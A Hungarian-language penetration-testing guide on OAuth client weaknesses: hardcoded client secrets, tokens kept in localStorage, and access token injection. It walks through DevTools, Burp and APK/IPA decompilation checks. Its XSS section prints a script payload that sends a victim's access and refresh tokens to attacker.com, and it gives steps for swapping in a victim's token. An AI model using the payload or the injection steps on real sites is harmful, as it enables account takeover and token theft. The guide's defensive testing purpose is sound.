# WSTG-AUTHZ-07: OAuth Client Weaknesses Tesztelése

## Mi a fejezet lényege?

Az **OAuth Client** weakness-ek **token exposure**-hoz és **unauthorized access**-hez vezetnek. **Client secret in JavaScript** (public client), **tokens in localStorage** (XSS-szel lopható), vagy **access token injection** (leaked token reuse) mind client-side OAuth vulnerability-k.

---

## 3 Fő Client Weakness

### 1. **Exposed Client Secret**
### 2. **Improper Token Storage**
### 3. **Access Token Injection**

---

## 1. Exposed Client Secret

### Concept:
**Public client** (SPA, mobile) **client_secret**-tel = **secret hardcoded**!

---

### Testing - Browser DevTools:

**Step 1: Open DevTools**
```
F12 → Debugger/Sources tab
```

**Step 2: Search codebase**
```
Ctrl+Shift+F (global search)

Search terms:
- client_secret
- clientSecret
- client-secret
- secret
- oauth_secret
```

---

**Example finding:**
```javascript
// app.js (line 245)
const config = {
  client_id: 'mobile-app-123',
  client_secret: 'hardcoded_secret_abc123xyz',  // EXPOSED!
  auth_url: 'https://as.example.com'
}
```

→ **CRITICAL!** Secret in client-side code!

---

### Testing - Intercept Traffic:

```bash
# Step through OAuth flow with Burp
# Look for client_secret in requests

POST /oauth/token HTTP/1.1

{
  "client_id": "spa-client",
  "client_secret": "exposed_secret_123",  ← Found!
  "grant_type": "authorization_code"
}
```

---

### Mobile App Testing:

```bash
# Decompile APK
apktool d app.apk

# Search for secrets
grep -r "client_secret" app/
grep -r "clientSecret" app/

# Or use jadx
jadx app.apk
# Browse to OAuth config classes
```

---

## 2. Improper Token Storage

### Concept:
Tokens in **localStorage** = **XSS** = **token theft**.

---

### Storage Comparison:

| Storage | XSS Access | Recommendation |
|---------|------------|----------------|
| **localStorage** | ✓ YES | ❌ NO (permanent) |
| **sessionStorage** | ✓ YES | ⚠️ OK (session only) |
| **Cookie (HttpOnly)** | ✗ NO | ✅ BEST |
| **Memory only** | ✗ NO | ✅ BEST (SPA) |

---

### Testing - Browser DevTools:

**Step 1: Login to application**

**Step 2: Open DevTools**
```
F12 → Application tab
```

**Step 3: Check localStorage**
```
Application → Storage → Local Storage → https://app.example.com

Look for:
- access_token
- refresh_token
- id_token
- oauth_token
- bearer_token
```

---

**Example finding:**
```
Key: access_token
Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM...
```

→ **HIGH!** Token in localStorage (XSS exploitable)

---

**Step 4: Check sessionStorage**
```
Application → Storage → Session Storage

Same tokens as above?
```

**Step 5: Check Cookies**
```
Application → Storage → Cookies

Look for tokens in cookies:
- HttpOnly flag? (good)
- Secure flag? (good)
- SameSite? (good)
```

---

### XSS Exploitation:

**If tokens in localStorage:**
```javascript
// Attacker's XSS payload
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    access_token: localStorage.getItem('access_token'),
    refresh_token: localStorage.getItem('refresh_token')
  })
});
</script>
```

→ Tokens stolen!

---

### Console Testing:

```javascript
// In browser console
console.log(localStorage.getItem('access_token'));
console.log(localStorage.getItem('refresh_token'));
console.log(sessionStorage.getItem('access_token'));

// Check all keys
for(let i=0; i<localStorage.length; i++) {
  let key = localStorage.key(i);
  console.log(key + ': ' + localStorage.getItem(key));
}
```

---

## 3. Access Token Injection

### Concept:
**Leaked token** injected into **victim's client**.

---

### Vulnerable Flows:

- **Implicit Flow** (token in URL fragment)
- **ROPC** (if token leaked)
- **Client Credentials** (if token leaked)

---

### Attack Scenario:

**Step 1: Attacker gets token**
```
Victim uses Implicit Flow
URL: https://app.com/callback#access_token=eyJhbGc...

Attacker captures token:
- Network sniffing (unsecured WiFi)
- Phishing attack
- XSS attack
- Leaked logs
```

**Step 2: Attacker injects token**
```bash
# Start OAuth flow as attacker
# Intercept callback
# Inject victim's token

# Normal callback:
https://app.com/callback#access_token=attacker_token_xyz

# Inject victim's token:
https://app.com/callback#access_token=victim_token_abc

# If client accepts → logged in as victim!
```

---

### Testing:

**Setup:**
```
1. Get two access tokens:
   - Token A (legitimate user A)
   - Token B (legitimate user B)
```

**Test 1: Direct injection**
```bash
# Start OAuth flow
# Intercept authorization response

# Normal:
Location: https://client.com/callback#access_token=tokenA

# Inject Token B:
Location: https://client.com/callback#access_token=tokenB

# Forward to client
# Check if logged in as User B
```

---

**Test 2: Replace in response**
```bash
# Capture valid OAuth response
# Intercept at callback

# Original response contains tokenA
# Replace with tokenB using Burp

# Forward modified response
# Client should reject or validate
```

---

### Mitigation Check:

**Client should validate:**
```
1. Token signature (JWT)
2. Token issuer (iss claim)
3. Token audience (aud claim)
4. Token expiry (exp claim)
5. Token subject matches authenticated user
```

**Testing validation:**
```bash
# Inject expired token
access_token=expired_token_xyz

# Inject token for different client_id
access_token=different_client_token

# Inject token with wrong signature
access_token=tampered_jwt_token

# Client should reject all!
```

---

## Comprehensive Testing Workflow

### Phase 1: Reconnaissance

```bash
# Browse application
# Complete OAuth flow
# Document all requests/responses
```

---

### Phase 2: Client Secret Search

```javascript
// DevTools → Sources → Search
client_secret
clientSecret
oauth_secret
bearer_secret

// Also check:
- config.js
- app.js
- bundle.js
- vendor.js
```

---

### Phase 3: Token Storage Analysis

```javascript
// Check all storage locations
console.log('localStorage:', localStorage);
console.log('sessionStorage:', sessionStorage);
console.log('cookies:', document.cookie);

// Extract tokens
let tokens = {};
for(let i=0; i<localStorage.length; i++) {
  let key = localStorage.key(i);
  if(key.includes('token') || key.includes('oauth')) {
    tokens[key] = localStorage.getItem(key);
  }
}
console.log('Found tokens:', tokens);
```

---

### Phase 4: Token Injection Test

```bash
# Get legitimate token
tokenA=eyJhbGc...

# Start new OAuth flow
# Intercept callback
# Inject tokenA

# Verify client behavior
```

---

## Mobile App Specific Testing

### Android APK:

```bash
# Decompile
apktool d app.apk

# Search secrets
grep -r "client_secret" app/smali/
grep -r "oauth" app/res/values/strings.xml

# Check SharedPreferences (token storage)
grep -r "SharedPreferences" app/smali/
# Look for token storage in preferences
```

---

### iOS IPA:

```bash
# Extract IPA
unzip app.ipa

# Search in binary
strings Payload/App.app/App | grep -i "secret"
strings Payload/App.app/App | grep -i "oauth"

# Check Info.plist
cat Payload/App.app/Info.plist | grep -i "oauth"
```

---

## Automated Testing Script

```javascript
// Run in browser console
function testOAuthClient() {
  console.log('=== OAuth Client Testing ===');
  
  // Test 1: Check localStorage
  console.log('[*] Checking localStorage...');
  let lsTokens = [];
  for(let i=0; i<localStorage.length; i++) {
    let key = localStorage.key(i);
    if(key.match(/token|oauth|bearer|access|refresh/i)) {
      lsTokens.push(key);
    }
  }
  if(lsTokens.length > 0) {
    console.log('[!] VULNERABLE: Tokens in localStorage:', lsTokens);
  }
  
  // Test 2: Check sessionStorage
  console.log('[*] Checking sessionStorage...');
  let ssTokens = [];
  for(let i=0; i<sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    if(key.match(/token|oauth|bearer|access|refresh/i)) {
      ssTokens.push(key);
    }
  }
  if(ssTokens.length > 0) {
    console.log('[!] WARNING: Tokens in sessionStorage:', ssTokens);
  }
  
  // Test 3: Check cookies
  console.log('[*] Checking cookies...');
  let cookies = document.cookie.split(';');
  let tokenCookies = cookies.filter(c => 
    c.match(/token|oauth|bearer|access|refresh/i)
  );
  if(tokenCookies.length > 0) {
    console.log('[+] Tokens in cookies (check HttpOnly):', tokenCookies);
  }
  
  console.log('=== Testing Complete ===');
}

testOAuthClient();
```

---

## Fontos Toolok

- **Browser DevTools** - Storage inspection
- **Burp Suite** - Traffic intercept
- **ZAP** - OAuth testing
- **apktool** - Android decompile
- **jadx** - Android reverse engineering

---

## Fontos Megjegyzések

✅ **Public client** = NO client_secret  
✅ **Tokens in HttpOnly cookies** (best)  
✅ **Memory-only** token storage (SPA)  
✅ **Token validation** (signature, iss, aud)  
❌ **client_secret in JavaScript** = exposed!  
❌ **Tokens in localStorage** = XSS exploitable!  
❌ **No token validation** = injection possible!  
⚠️ **sessionStorage** better than localStorage  
⚠️ **Mobile apps** = decompilable!  

---

**Összefoglalva:** **OAuth Client weaknesses** = secret exposure + improper storage + token injection. **Client secret**: search in DevTools (Ctrl+Shift+F "client_secret"), mobile decompile (apktool, jadx). **Token storage**: check localStorage (BAD), sessionStorage (OK), HttpOnly cookies (BEST). **Access token injection**: intercept callback, replace token, test if client validates. **XSS + localStorage** = token theft! **Public clients** (SPA, mobile) **NEVER** should have client_secret!
